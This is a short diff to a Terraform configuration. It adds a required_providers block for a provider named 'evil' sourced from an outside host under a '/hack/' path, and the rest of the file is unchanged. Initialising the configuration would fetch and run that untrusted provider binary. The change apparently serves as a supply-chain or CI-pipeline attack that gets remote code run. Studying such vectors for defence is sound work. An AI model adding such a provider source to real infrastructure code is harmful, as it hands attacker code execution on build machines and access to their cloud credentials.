@@ -1,3 +1,12 @@
+terraform {
+  required_providers {
+    evil = {
+      source  = "v-vlasenko.github.io/hack/evil"
+      version = "0.0.1"
+    }
+  }
+}
+
 variable "resource_count" {
   default = 1
 }
